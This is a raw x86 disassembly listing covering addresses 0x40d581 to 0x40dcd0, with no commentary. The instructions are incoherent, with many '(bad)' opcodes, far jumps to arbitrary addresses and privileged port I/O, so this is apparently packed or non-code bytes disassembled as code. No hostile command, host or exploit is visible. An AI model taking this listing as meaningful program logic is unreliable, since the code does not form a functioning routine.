  40d581:	loope  0x40d565
  40d583:	int3   
  40d584:	push   edi
  40d585:	mov    bl,BYTE PTR [ecx]
  40d587:	adc    DWORD PTR [edi],ebp
  40d589:	loope  0x40d521
  40d58b:	sar    DWORD PTR [eax+edi*8+0x4530320d],0x6
  40d593:	mov    ah,0xa4
  40d595:	in     eax,dx
  40d596:	add    al,0xa1
  40d598:	dec    edi
  40d599:	outs   dx,BYTE PTR ds:[esi]
  40d59a:	outs   dx,BYTE PTR ds:[esi]
  40d59b:	ret    
  40d59c:	jmp    0x614058c9
  40d5a1:	dec    edi
  40d5a2:	jp     0x40d578
  40d5a4:	(bad)  
  40d5a5:	cmc    
  40d5a6:	add    BYTE PTR [esi],ch
  40d5a8:	xchg   ecx,eax
  40d5a9:	cmp    DWORD PTR [eax+0x43],esp
  40d5ac:	pusha  
  40d5ad:	jmp    0x181c8e20
  40d5b2:	fs push ecx
  40d5b4:	lock cmp BYTE PTR [ecx+0x5ad68171],ch
  40d5bb:	dec    edx
  40d5bc:	mov    edx,esi
  40d5be:	test   eax,0x77c292a0
  40d5c3:	xlat   BYTE PTR ds:[ebx]
  40d5c4:	jl     0x40d60c
  40d5c6:	xchg   ah,al
  40d5c8:	sbb    eax,0x13850d6b
  40d5cd:	pop    ds
  40d5ce:	out    0x9a,al
  40d5d0:	pop    es
  40d5d1:	pop    edi
  40d5d2:	test   eax,0x3113e561
  40d5d7:	sar    al,0x70
  40d5da:	repz and DWORD PTR [ecx-0x42],0x253f3e34
  40d5e2:	push   ebx
  40d5e3:	je     0x40d624
  40d5e5:	scas   eax,DWORD PTR es:[edi]
  40d5e6:	ror    DWORD PTR [edi+0x29ebcfc1],1
  40d5ec:	inc    esp
  40d5ed:	aaa    
  40d5ee:	and    ah,BYTE PTR [edx]
  40d5f0:	inc    ebp
  40d5f1:	shr    BYTE PTR [edx-0x122f45ed],cl
  40d5f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5f8:	imul   edx,edx,0x6f
  40d5fb:	out    0x7,eax
  40d5fd:	jecxz  0x40d607
  40d5ff:	pusha  
  40d600:	adc    eax,0x9c6ee03a
  40d605:	idiv   DWORD PTR [edx]
  40d607:	into   
  40d608:	adc    DWORD PTR [esp+edi*8+0x3913f6e2],esi
  40d60f:	mov    bl,0xbf
  40d611:	aad    0xdc
  40d613:	sbb    al,0x33
  40d615:	test   al,0xd1
  40d617:	fnsave [esi+0x31]
  40d61a:	and    al,0x25
  40d61c:	jg     0x40d5a0
  40d61e:	jecxz  0x40d5c3
  40d620:	stos   BYTE PTR es:[edi],al
  40d621:	in     eax,dx
  40d622:	int    0x55
  40d624:	add    eax,0x80280c3a
  40d629:	fnstsw WORD PTR [eax]
  40d62b:	jle    0x40d621
  40d62d:	push   ebp
  40d62e:	lods   eax,DWORD PTR ds:[esi]
  40d62f:	cmp    eax,0xf931c325
  40d634:	and    eax,0x48b08a6a
  40d639:	and    eax,0x4efc11a4
  40d63e:	add    edx,ebx
  40d640:	and    BYTE PTR [edi-0x19],dl
  40d643:	mov    ch,0x7a
  40d645:	iret   
  40d646:	outs   dx,DWORD PTR ds:[esi]
  40d647:	jp     0x40d683
  40d649:	lods   al,BYTE PTR ds:[esi]
  40d64a:	scas   eax,DWORD PTR es:[edi]
  40d64b:	mov    cl,0x95
  40d64d:	xor    DWORD PTR [edi+0x9],ecx
  40d650:	(bad)  
  40d651:	test   al,0xee
  40d653:	sar    bh,cl
  40d655:	xlat   BYTE PTR ds:[ebx]
  40d656:	and    esi,DWORD PTR [ebx+0x83765e0]
  40d65c:	loop   0x40d6cd
  40d65e:	shl    BYTE PTR [eax+ecx*8],1
  40d661:	jl     0x40d675
  40d663:	mov    edx,0xcd977d9c
  40d668:	xchg   ebp,eax
  40d669:	jmp    0xc00aaa8e
  40d66e:	sub    al,BYTE PTR [ecx]
  40d670:	mov    eax,esp
  40d672:	int3   
  40d673:	jo     0x40d663
  40d675:	test   eax,0xf3cd5dc2
  40d67a:	sbb    al,0x9c
  40d67c:	push   ebx
  40d67d:	sahf   
  40d67e:	and    al,0x68
  40d680:	fsub   QWORD PTR [esi+0x36]
  40d683:	int3   
  40d684:	rcr    DWORD PTR [ebp-0x2c],cl
  40d687:	icebp  
  40d688:	stc    
  40d689:	fstp   DWORD PTR [eax-0x56]
  40d68c:	outs   dx,BYTE PTR ds:[esi]
  40d68d:	inc    esi
  40d68e:	(bad)  
  40d68f:	jmp    0xae8fd345
  40d694:	or     ebp,eax
  40d696:	jge    0x40d707
  40d698:	loopne 0x40d654
  40d69a:	inc    ecx
  40d69b:	arpl   WORD PTR [ecx],bp
  40d69d:	iret   
  40d69e:	mov    ebx,0x6fd95413
  40d6a3:	lock imul ebp,esp,0xd3e2126e
  40d6aa:	(bad)  
  40d6ab:	mov    ah,0x28
  40d6ad:	scas   eax,DWORD PTR es:[edi]
  40d6ae:	dec    eax
  40d6af:	push   es
  40d6b0:	xchg   DWORD PTR [ebx],ecx
  40d6b2:	add    ebx,DWORD PTR [ebx+ecx*1+0x1b]
  40d6b6:	sbb    BYTE PTR [esi+0xfde045b],bl
  40d6bc:	push   0xb5a00077
  40d6c1:	loope  0x40d725
  40d6c3:	or     al,0x59
  40d6c5:	fisttp QWORD PTR [esp+eiz*4-0x21]
  40d6c9:	inc    eax
  40d6ca:	xchg   esi,eax
  40d6cb:	out    0xcb,eax
  40d6cd:	(bad)  
  40d6ce:	adc    DWORD PTR [eax+eax*1],ebx
  40d6d1:	cmp    DWORD PTR [eax+ebx*8-0x5b],esi
  40d6d5:	sub    al,0x33
  40d6d7:	pushf  
  40d6d8:	mov    ch,0x34
  40d6da:	or     edi,edx
  40d6dc:	outs   dx,BYTE PTR ds:[esi]
  40d6dd:	cmp    edx,0xfb757372
  40d6e3:	and    edx,0x7f93a9bc
  40d6e9:	addr16 or ebp,esi
  40d6ec:	cld    
  40d6ed:	adc    eax,0x1b1cfbc4
  40d6f2:	dec    ebp
  40d6f3:	dec    esp
  40d6f4:	xor    al,0x8a
  40d6f6:	jp     0x40d73e
  40d6f8:	cmp    eax,0x29c41e2e
  40d6fd:	sbb    eax,0xef3dca87
  40d702:	icebp  
  40d703:	jg     0x40d6fe
  40d705:	cmp    ecx,DWORD PTR [eax-0x457b69d4]
  40d70b:	mov    al,BYTE PTR [edx-0x743dcc6e]
  40d711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d712:	fcom   DWORD PTR [ecx+0x4a]
  40d715:	and    DWORD PTR [edx-0x13],esi
  40d718:	stos   BYTE PTR es:[edi],al
  40d719:	pop    edx
  40d71a:	and    eax,0x289f520d
  40d71f:	push   edx
  40d720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d721:	push   ecx
  40d722:	push   eax
  40d723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d724:	fild   WORD PTR ds:0x4d9848df
  40d72a:	ins    DWORD PTR es:[edi],dx
  40d72b:	fcmovnbe st,st(4)
  40d72d:	cmp    eax,0x1f6fa29e
  40d732:	das    
  40d733:	test   esi,edi
  40d735:	dec    edx
  40d736:	arpl   WORD PTR [ebx],bp
  40d738:	sbb    eax,0x1843d8c3
  40d73d:	sub    edi,ebp
  40d73f:	inc    edi
  40d740:	cmp    esi,esi
  40d742:	cld    
  40d743:	push   esp
  40d744:	add    BYTE PTR [esi-0xbea50ec],0x74
  40d74b:	mov    eax,ds:0x1c86eebe
  40d750:	sbb    DWORD PTR [edx],esi
  40d752:	jae    0x40d754
  40d754:	push   0xfffffff9
  40d756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d757:	in     al,0xe7
  40d759:	enter  0xc8b8,0xe0
  40d75d:	imul   ebx,DWORD PTR [ebp-0x6c],0x6e
  40d761:	mov    bh,0xfa
  40d763:	sbb    eax,ebp
  40d765:	xchg   ecx,eax
  40d766:	ffreep st(0)
  40d768:	cmp    DWORD PTR [ebx+0x5040afb3],eax
  40d76e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d76f:	inc    eax
  40d770:	xor    eax,0xbae2e8e2
  40d775:	pop    esi
  40d776:	pop    ebp
  40d777:	das    
  40d778:	outs   dx,DWORD PTR ds:[esi]
  40d779:	sbb    edi,DWORD PTR [edi]
  40d77b:	xor    BYTE PTR [ecx+0x57],ch
  40d77e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d77f:	xchg   ebx,eax
  40d780:	push   edx
  40d781:	add    ebx,DWORD PTR [eax]
  40d783:	inc    esp
  40d784:	xchg   edi,eax
  40d785:	sub    eax,0x59f63889
  40d78a:	inc    ebp
  40d78b:	cmp    eax,0x664a053c
  40d790:	ja     0x40d7b5
  40d792:	sub    al,BYTE PTR [ecx]
  40d794:	xchg   edi,eax
  40d795:	ins    DWORD PTR es:[edi],dx
  40d796:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d797:	add    BYTE PTR [eax+0x3c],cl
  40d79a:	arpl   WORD PTR [edx+ecx*8],cx
  40d79d:	and    DWORD PTR [ebp+edx*1-0x37],ebp
  40d7a1:	and    dh,BYTE PTR [eax]
  40d7a3:	cwde   
  40d7a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7a5:	iret   
  40d7a6:	jnp    0x40d7df
  40d7a8:	jge    0x40d802
  40d7aa:	or     al,0x45
  40d7ac:	lods   al,BYTE PTR ds:[esi]
  40d7ad:	hlt    
  40d7ae:	(bad)  
  40d7af:	mov    ah,0xd3
  40d7b1:	dec    al
  40d7b3:	out    dx,eax
  40d7b4:	mov    al,ds:0x8c215f23
  40d7b9:	(bad)  
  40d7ba:	adc    BYTE PTR [eax+edi*2],bh
  40d7bd:	mov    dl,0xff
  40d7bf:	in     al,dx
  40d7c0:	aad    0x10
  40d7c2:	sub    BYTE PTR [ecx],ch
  40d7c4:	aam    0x9e
  40d7c6:	dec    eax
  40d7c7:	mov    fs,WORD PTR [ebp+0x5fbad603]
  40d7cd:	cli    
  40d7ce:	out    0x86,eax
  40d7d0:	les    esp,FWORD PTR [edi-0x521e21eb]
  40d7d6:	mov    bl,0x18
  40d7d8:	and    al,0x7f
  40d7da:	jl     0x40d7fb
  40d7dc:	jmp    0x40d766
  40d7de:	mov    ebx,0xe951f746
  40d7e3:	sbb    DWORD PTR [esi+0x7353dbdc],edi
  40d7e9:	aas    
  40d7ea:	sahf   
  40d7eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7ec:	test   DWORD PTR [ebp-0x6b],eax
  40d7ef:	push   ecx
  40d7f0:	xor    esi,DWORD PTR [ebx+edi*4]
  40d7f3:	pop    esp
  40d7f4:	dec    ebx
  40d7f5:	jo     0x40d7ac
  40d7f7:	pop    esi
  40d7f8:	imul   ecx,DWORD PTR [edi-0x1c],0xa5afc93b
  40d7ff:	dec    ecx
  40d800:	adc    eax,0x1724c6c
  40d805:	test   DWORD PTR [ebx-0x70],ebx
  40d808:	inc    ebx
  40d809:	jnp    0x40d7fa
  40d80b:	sar    esp,cl
  40d80d:	mov    esp,0xda3cfeae
  40d812:	std    
  40d813:	mov    bl,0xb8
  40d815:	xchg   edi,eax
  40d816:	cmp    DWORD PTR ds:0xdacb28c3,eax
  40d81c:	stos   DWORD PTR es:[edi],eax
  40d81d:	add    eax,0xafc644cb
  40d822:	inc    eax
  40d823:	pop    ds
  40d824:	mov    dh,0xc4
  40d826:	ror    DWORD PTR [ebp+edi*4+0x1b],0x56
  40d82b:	jle    0x40d8aa
  40d82d:	mov    al,0xc2
  40d82f:	out    0x47,al
  40d831:	cwde   
  40d832:	das    
  40d833:	cwde   
  40d834:	inc    eax
  40d835:	cs or  edx,ebp
  40d838:	nop
  40d839:	cdq    
  40d83a:	mov    al,0x61
  40d83c:	add    esp,eax
  40d83e:	addr16 call 0x1eecaf04
  40d844:	scas   eax,DWORD PTR es:[edi]
  40d845:	push   ecx
  40d846:	jae    0x40d7cf
  40d848:	loop   0x40d877
  40d84a:	xor    eax,0xf9b94049
  40d84f:	inc    BYTE PTR [esp+eax*8+0x4]
  40d853:	pop    esi
  40d854:	xor    al,0x2b
  40d856:	or     esi,ecx
  40d858:	jmp    DWORD PTR [ebp+0x5]
  40d85b:	mov    dl,bl
  40d85d:	int3   
  40d85e:	das    
  40d85f:	ret    
  40d860:	add    BYTE PTR [ebp+0x6d380194],0x60
  40d867:	fcmovbe st,st(6)
  40d869:	sub    al,0xd0
  40d86b:	test   al,0x49
  40d86d:	hlt    
  40d86e:	sahf   
  40d86f:	push   eax
  40d870:	pmuludq mm6,QWORD PTR [ecx+ebx*4]
  40d874:	imul   esi,DWORD PTR [edx-0x4e97cac8],0x416a8ff1
  40d87e:	push   ecx
  40d87f:	call   0x581f2dd5
  40d884:	aam    0x68
  40d886:	cmp    BYTE PTR [edx+0x7f],dl
  40d889:	pop    esi
  40d88a:	js     0x40d8eb
  40d88c:	shl    edx,1
  40d88e:	ss inc edi
  40d890:	inc    eax
  40d891:	cld    
  40d892:	inc    esi
  40d893:	idiv   DWORD PTR [ecx-0xa]
  40d896:	sbb    eax,0x4a99488f
  40d89b:	fs mov bh,0x8f
  40d89e:	adc    bl,BYTE PTR [eax-0x16d13082]
  40d8a4:	ret    
  40d8a5:	push   ebp
  40d8a6:	add    DWORD PTR [ebx],edi
  40d8a8:	and    al,0x8
  40d8aa:	dec    esi
  40d8ab:	out    0xd,eax
  40d8ad:	jmp    0x31d6992d
  40d8b2:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8b4:	fisttp QWORD PTR [edx-0x4902f827]
  40d8ba:	aad    0x3e
  40d8bc:	pop    ss
  40d8bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8be:	mov    ecx,0x3b35608c
  40d8c3:	jg     0x40d894
  40d8c5:	dec    esi
  40d8c6:	adc    al,BYTE PTR [edi]
  40d8c8:	call   DWORD PTR [ebp+0x260fab28]
  40d8ce:	out    dx,al
  40d8cf:	and    bl,BYTE PTR [ebp+0x4c]
  40d8d2:	push   es
  40d8d3:	push   0xffffffb9
  40d8d5:	je     0x40d85a
  40d8d7:	pusha  
  40d8d8:	bound  ebx,QWORD PTR [ebp-0x1e]
  40d8db:	and    DWORD PTR [eax],esp
  40d8dd:	adc    eax,0x6bdc34db
  40d8e2:	add    cl,bl
  40d8e4:	repz mov edi,0xd0c0baa3
  40d8ea:	dec    ecx
  40d8eb:	jp     0x40d8ad
  40d8ed:	into   
  40d8ee:	and    dl,BYTE PTR [edi+0x23]
  40d8f1:	xor    cl,BYTE PTR [esp+ecx*8+0x69]
  40d8f5:	js     0x40d8c3
  40d8f7:	push   ss
  40d8f8:	xchg   BYTE PTR [ebx+0x16],dl
  40d8fb:	(bad)  
  40d8fc:	jno    0x40d92a
  40d8fe:	(bad)
  40d901:	cmp    BYTE PTR [ebx-0x73921dc5],0x2f
  40d908:	in     eax,0xf2
  40d90a:	scas   eax,DWORD PTR es:[edi]
  40d90b:	ret    
  40d90c:	ins    DWORD PTR es:[edi],dx
  40d90d:	push   ebx
  40d90e:	hlt    
  40d90f:	mov    bl,BYTE PTR gs:[ecx+0x65]
  40d913:	mov    dh,0xe7
  40d915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d916:	arpl   cx,bp
  40d918:	rol    DWORD PTR [ebp-0xd53bf7f],cl
  40d91e:	mov    esp,edi
  40d920:	rcl    esp,cl
  40d922:	icebp  
  40d923:	icebp  
  40d924:	lahf   
  40d925:	mov    ah,0xa3
  40d927:	fldenv [esp+edi*1]
  40d92a:	dec    ecx
  40d92b:	jge    0x40d946
  40d92d:	mov    edx,0x596354a0
  40d932:	(bad)  
  40d933:	imul   BYTE PTR [ecx+0x32]
  40d936:	mov    dl,0xff
  40d938:	xor    dh,BYTE PTR [esi-0x7f]
  40d93b:	mov    ds:0x739460f1,eax
  40d940:	cmp    cl,BYTE PTR [edx-0x23cd9d8a]
  40d946:	test   eax,ecx
  40d948:	mov    al,0xa9
  40d94a:	pop    eax
  40d94b:	pop    es
  40d94c:	scas   eax,DWORD PTR es:[edi]
  40d94d:	ret    0x182c
  40d950:	ret    0xa00b
  40d953:	or     al,0x6d
  40d955:	cli    
  40d956:	mov    al,ds:0x9dbbae75
  40d95b:	push   es
  40d95c:	xor    DWORD PTR [esi],esp
  40d95e:	in     al,0xde
  40d960:	xchg   BYTE PTR [edx-0xf47a4ad],cl
  40d966:	mov    gs,WORD PTR [edx+0x24e603c1]
  40d96c:	push   cs
  40d96d:	shl    ebx,1
  40d96f:	loope  0x40d956
  40d971:	add    eax,0x33da83d4
  40d976:	ins    DWORD PTR es:[edi],dx
  40d977:	sar    bl,1
  40d979:	mov    ds:0x2f5a31f8,al
  40d97e:	push   ds
  40d97f:	scas   al,BYTE PTR es:[edi]
  40d980:	ret    0x6697
  40d983:	jno    0x40d976
  40d985:	test   eax,0x1ea3c6a1
  40d98a:	sbb    eax,0x8703bea8
  40d98f:	fwait
  40d990:	and    ebx,DWORD PTR [bp+di+0x70]
  40d994:	pop    edi
  40d995:	jge    0x40d9b0
  40d997:	test   eax,0xf49b0bce
  40d99c:	inc    ebp
  40d99d:	jae    0x40d9f9
  40d99f:	pop    ebp
  40d9a0:	push   ebx
  40d9a1:	xlat   BYTE PTR ds:[ebx]
  40d9a2:	xchg   esi,eax
  40d9a3:	inc    edi
  40d9a4:	(bad)  
  40d9a5:	shl    BYTE PTR [edi-0x2e631185],1
  40d9ab:	dec    ecx
  40d9ac:	and    dl,BYTE PTR [ecx+0x29f06e9b]
  40d9b2:	mov    dl,0x6f
  40d9b4:	hlt    
  40d9b5:	mov    cr7,esi
  40d9b8:	sti    
  40d9b9:	cdq    
  40d9ba:	cmp    eax,0xb0b40262
  40d9bf:	rcl    DWORD PTR [edi],0x36
  40d9c2:	shl    DWORD PTR ds:0x7b86de52,1
  40d9c8:	ret    
  40d9c9:	stc    
  40d9ca:	pop    ebp
  40d9cb:	mov    bl,cl
  40d9cd:	call   0x751a:0x503b1066
  40d9d4:	xlat   BYTE PTR ds:[ebx]
  40d9d5:	push   ss
  40d9d6:	xor    eax,0x2b0c3c8b
  40d9db:	shl    BYTE PTR [ebx+edx*2],cl
  40d9de:	mov    ecx,0xa5c4bf90
  40d9e3:	rcr    esp,0xf5
  40d9e6:	and    ebp,DWORD PTR [esi]
  40d9e8:	jae    0x40d97a
  40d9ea:	add    esp,0x5b92a378
  40d9f0:	gs cmp al,0x79
  40d9f3:	test   DWORD PTR [ebp+0x62051a9a],edi
  40d9f9:	sub    bh,BYTE PTR [esi]
  40d9fb:	ret    
  40d9fc:	jnp    0x40da1a
  40d9fe:	sub    al,0x77
  40da00:	mov    eax,0x62b80187
  40da05:	push   cs
  40da06:	cdq    
  40da07:	sbb    al,0xeb
  40da09:	mov    bh,0x21
  40da0b:	sub    ch,ah
  40da0d:	fstp   DWORD PTR [esp+ebx*4]
  40da10:	pop    es
  40da11:	push   ss
  40da12:	sub    bl,ch
  40da14:	jl     0x40d9d0
  40da16:	mov    eax,DWORD PTR [esi-0x6c]
  40da19:	cmp    al,0x5e
  40da1b:	les    ebx,FWORD PTR ds:[esi-0x264c7cc1]
  40da22:	mov    WORD PTR [ecx-0x36],?
  40da25:	aam    0xa1
  40da27:	shr    DWORD PTR [esi-0x11],cl
  40da2a:	adc    ebx,0xffffff91
  40da2d:	mov    dh,0x45
  40da2f:	mov    ebp,0xb72648e3
  40da34:	mov    ebx,0x74b53bf7
  40da39:	mov    bh,0x14
  40da3b:	xor    eax,0x22d967e5
  40da40:	int    0xa4
  40da42:	cmp    ah,BYTE PTR [esi]
  40da44:	push   0xc2906ec1
  40da49:	stos   DWORD PTR es:[edi],eax
  40da4a:	cmc    
  40da4b:	jbe    0x40daab
  40da4d:	jp     0x40da43
  40da4f:	iret   
  40da50:	push   eax
  40da51:	jns    0x40dab2
  40da53:	in     eax,dx
  40da54:	mov    bl,0x99
  40da56:	repnz and DWORD PTR [eax],esi
  40da59:	mov    ebx,0x44a409aa
  40da5e:	js     0x40daa1
  40da60:	xchg   ecx,eax
  40da61:	rcr    BYTE PTR [ebp-0x458d2198],1
  40da67:	adc    eax,0x8800965b
  40da6c:	call   0xee8b:0x698704c4
  40da73:	adc    ebx,DWORD PTR [ecx-0x3]
  40da76:	sbb    ecx,0xeb94c17b
  40da7c:	sbb    al,0x7f
  40da7e:	repnz mov ch,0xc8
  40da81:	mov    esi,0x8e0bf50f
  40da86:	xchg   DWORD PTR [eax],ebp
  40da88:	pop    es
  40da89:	xor    DWORD PTR [ebp-0x7b],ebp
  40da8c:	rcr    DWORD PTR [esp+edx*1-0xc],cl
  40da90:	inc    ebp
  40da91:	dec    esp
  40da92:	adc    ebx,edi
  40da94:	loope  0x40da1e
  40da96:	std    
  40da97:	xor    ebx,DWORD PTR [ebp+0x48813903]
  40da9d:	ret    
  40da9e:	addr16 jmp 0x8c0d:0x241670e5
  40daa6:	or     eax,DWORD PTR [eax]
  40daa8:	or     bl,BYTE PTR [edx+0x24206199]
  40daae:	push   0xc47bdf3a
  40dab3:	cmp    eax,0x3368964c
  40dab8:	ficomp WORD PTR [edi]
  40daba:	jns    0x40db0a
  40dabc:	dec    edi
  40dabd:	mov    ah,0x3f
  40dabf:	pop    ecx
  40dac0:	leave  
  40dac1:	mov    BYTE PTR [edx-0x699bc6e5],bh
  40dac7:	add    bh,ch
  40dac9:	fucom  st(1)
  40dacb:	out    0x7,al
  40dacd:	lds    esp,FWORD PTR [ebx+0x200001b2]
  40dad3:	inc    edi
  40dad4:	addr16 loopne 0x40db19
  40dad7:	add    ebp,DWORD PTR [eax]
  40dad9:	jne    0x40db4e
  40dadb:	inc    edx
  40dadc:	sub    ch,BYTE PTR [ebp+0x51f769d9]
  40dae2:	mov    bl,0xd3
  40dae4:	popf   
  40dae5:	inc    eax
  40dae6:	mov    ds:0xa0f29e02,al
  40daeb:	cmp    eax,0xb5cdd5ef
  40daf0:	mov    cl,0xa
  40daf2:	sti    
  40daf3:	sub    BYTE PTR [ecx-0x7407f505],0x1
  40dafa:	xchg   edi,eax
  40dafb:	xchg   edi,eax
  40dafc:	lock shl BYTE PTR [ecx-0xa],1
  40db00:	ret    
  40db01:	aaa    
  40db02:	adc    BYTE PTR [ebx],ch
  40db04:	mov    ds:0x6d3d06dc,al
  40db09:	pop    edx
  40db0a:	mov    bh,0x1f
  40db0c:	jle    0x40dabe
  40db0e:	ret    
  40db0f:	loope  0x40db29
  40db11:	icebp  
  40db12:	shl    BYTE PTR [eax-0x108c1c53],0x51
  40db19:	dec    esp
  40db1a:	xchg   DWORD PTR [edi-0x2e8f040d],ecx
  40db20:	(bad)  
  40db21:	into   
  40db22:	sub    BYTE PTR [edi],al
  40db24:	mov    edi,0xea4a6dff
  40db29:	fldcw  WORD PTR [ecx-0x16]
  40db2c:	adc    BYTE PTR [edx-0x2],al
  40db2f:	or     DWORD PTR [esi+0x2fdae9d2],esi
  40db35:	in     al,dx
  40db36:	mov    edi,ss
  40db38:	pop    esp
  40db39:	sub    DWORD PTR [edx+0x47a36e5b],ecx
  40db3f:	mov    dl,0xb4
  40db41:	mov    dh,BYTE PTR [esi]
  40db43:	sub    edx,esi
  40db45:	inc    ecx
  40db46:	push   ecx
  40db47:	mov    edx,0x4a8e792d
  40db4c:	cdq    
  40db4d:	scas   al,BYTE PTR es:[edi]
  40db4e:	inc    ebp
  40db4f:	daa    
  40db50:	lods   al,BYTE PTR ds:[esi]
  40db51:	add    ebp,ecx
  40db53:	sbb    al,0xc0
  40db55:	ja     0x40db4f
  40db57:	rcl    BYTE PTR [ecx+0x1922f79e],1
  40db5d:	dec    edx
  40db5e:	jg     0x40dbaf
  40db60:	lahf   
  40db61:	cwde   
  40db62:	inc    esi
  40db63:	jne    0x40dbdb
  40db65:	out    dx,al
  40db66:	add    ebx,ecx
  40db68:	nop
  40db69:	out    0xe3,eax
  40db6b:	push   ebp
  40db6c:	push   esp
  40db6d:	sub    ebx,DWORD PTR [eax-0x6c]
  40db70:	mov    al,ds:0x565d520e
  40db75:	int    0x14
  40db77:	sbb    BYTE PTR [edx-0x4064962e],0xe7
  40db7e:	test   al,0x92
  40db80:	sub    dh,ah
  40db82:	pop    ebp
  40db83:	cmp    al,0x1
  40db85:	adc    DWORD PTR [esi+0x48b74fbb],esp
  40db8b:	and    al,0xfd
  40db8d:	jo     0x40dbbf
  40db8f:	repz fimul WORD PTR [eax-0x35]
  40db93:	aaa    
  40db94:	sbb    al,0xf0
  40db96:	jecxz  0x40dbce
  40db98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db99:	call   esi
  40db9b:	mov    BYTE PTR [ebp-0x57c33167],al
  40dba1:	fisttp WORD PTR [esi+edi*1]
  40dba4:	pop    eax
  40dba5:	iret   
  40dba6:	inc    ecx
  40dba7:	not    DWORD PTR [edx]
  40dba9:	push   eax
  40dbaa:	call   0x8fbe:0xe6a09b01
  40dbb1:	push   0x24
  40dbb3:	inc    esp
  40dbb4:	outs   dx,DWORD PTR ds:[esi]
  40dbb5:	push   edi
  40dbb6:	(bad)  
  40dbb7:	bound  ecx,QWORD PTR [edx]
  40dbb9:	jne    0x40dc25
  40dbbb:	not    cl
  40dbbd:	xchg   DWORD PTR [ecx-0x4a4c6949],ebx
  40dbc3:	jne    0x40db5a
  40dbc5:	pop    esp
  40dbc6:	xor    DWORD PTR [edx-0x5b6bf669],ecx
  40dbcc:	xor    DWORD PTR [ebx-0x6f29d2f9],esi
  40dbd2:	fcomp  st(0)
  40dbd4:	sub    BYTE PTR [ecx],bh
  40dbd6:	push   ebx
  40dbd7:	mov    dl,bh
  40dbd9:	xchg   DWORD PTR [ecx],esi
  40dbdb:	mov    ebp,0x6ddcded
  40dbe0:	push   ebp
  40dbe1:	arpl   bp,bx
  40dbe3:	fidiv  WORD PTR [edx+0x6758bda9]
  40dbe9:	and    BYTE PTR [ebp+0x26a60083],dh
  40dbef:	push   eax
  40dbf0:	pop    esp
  40dbf1:	mov    bl,0x90
  40dbf3:	push   esp
  40dbf4:	sub    eax,edi
  40dbf6:	je     0x40dbea
  40dbf8:	test   ebx,edx
  40dbfa:	xchg   ebx,eax
  40dbfb:	aam    0xcc
  40dbfd:	sub    DWORD PTR [ecx-0x2623cddd],esi
  40dc03:	dec    edi
  40dc04:	sub    ch,dl
  40dc06:	retf   
  40dc07:	arpl   di,ax
  40dc09:	jae    0x40dc09
  40dc0b:	jmp    0x462f5933
  40dc10:	aaa    
  40dc11:	cmp    DWORD PTR [esi-0x6f],ebx
  40dc14:	enter  0x4b35,0xb3
  40dc18:	retf   
  40dc19:	je     0x40dc44
  40dc1b:	ds popa 
  40dc1d:	aad    0x2f
  40dc1f:	push   esp
  40dc20:	pop    edi
  40dc21:	mov    esi,DWORD PTR [edx]
  40dc23:	or     al,0x23
  40dc25:	in     al,dx
  40dc26:	mov    al,0xf7
  40dc28:	and    al,0x1e
  40dc2a:	push   ecx
  40dc2b:	pop    ebx
  40dc2c:	sub    BYTE PTR [esi+edx*1-0x7f89e90],dh
  40dc33:	mov    dh,0x5
  40dc35:	es cmp BYTE PTR gs:[esi-0x15],0x14
  40dc3b:	(bad)
  40dc3e:	pusha  
  40dc3f:	jge    0x40dbd4
  40dc41:	mov    DWORD PTR [ebx-0xa],esi
  40dc44:	(bad)  
  40dc45:	loopne 0x40dc29
  40dc47:	pop    ds
  40dc48:	xchg   edx,eax
  40dc49:	iret   
  40dc4a:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40dc4c:	stc    
  40dc4d:	rcl    BYTE PTR [esi],0x7a
  40dc50:	mov    edx,0xeb9b9a51
  40dc55:	rcr    BYTE PTR [esi-0x2c],0xfa
  40dc59:	leave  
  40dc5a:	in     al,0xf2
  40dc5c:	adc    eax,DWORD PTR [ecx-0x7c]
  40dc5f:	stos   DWORD PTR es:[edi],eax
  40dc60:	or     edi,DWORD PTR [edi-0x32]
  40dc63:	cmp    bl,cl
  40dc65:	push   esp
  40dc66:	sub    al,0xcd
  40dc68:	mov    ah,0x29
  40dc6a:	or     eax,0x2aebe5d6
  40dc6f:	pop    esi
  40dc70:	xor    cl,BYTE PTR [edx+edx*8+0x13]
  40dc74:	mov    edi,0x643e8aed
  40dc79:	fistp  WORD PTR [esi+0x6997e06e]
  40dc7f:	cs xchg ebp,eax
  40dc81:	mov    dh,0xa5
  40dc83:	jmp    0xc1a2:0xd2fb2232
  40dc8a:	cwde   
  40dc8b:	in     eax,0x94
  40dc8d:	pcmpeqw mm5,QWORD PTR [edi+0x31]
  40dc91:	stc    
  40dc92:	std    
  40dc93:	out    0xf6,eax
  40dc95:	inc    ecx
  40dc96:	xchg   esp,eax
  40dc97:	pop    edx
  40dc98:	hlt    
  40dc99:	jecxz  0x40dcc1
  40dc9b:	pop    edi
  40dc9c:	rol    BYTE PTR [edi-0x64],1
  40dc9f:	or     eax,0x68d82172
  40dca4:	cwde   
  40dca5:	or     BYTE PTR [ecx-0x6a],dl
  40dca8:	push   es
  40dca9:	mov    WORD PTR [esi],es
  40dcab:	fild   DWORD PTR [esp+edx*8+0x4372f92]
  40dcb2:	adc    al,0x8
  40dcb4:	fst    QWORD PTR [eax-0x61602abe]
  40dcba:	or     BYTE PTR [esi],cl
  40dcbc:	push   edi
  40dcbd:	frstor [ecx+0x2f]
  40dcc0:	mov    ah,0x7b
  40dcc2:	cmp    al,0x16
  40dcc4:	rcr    DWORD PTR [eax+0x0],1
  40dcc7:	retf   
  40dcc8:	pop    esp
  40dcc9:	retf   
  40dcca:	mov    ds:0x9e80194f,al
  40dccf:	stos   BYTE PTR es:[edi],al
  40dcd0:	sbb    al,0x5e
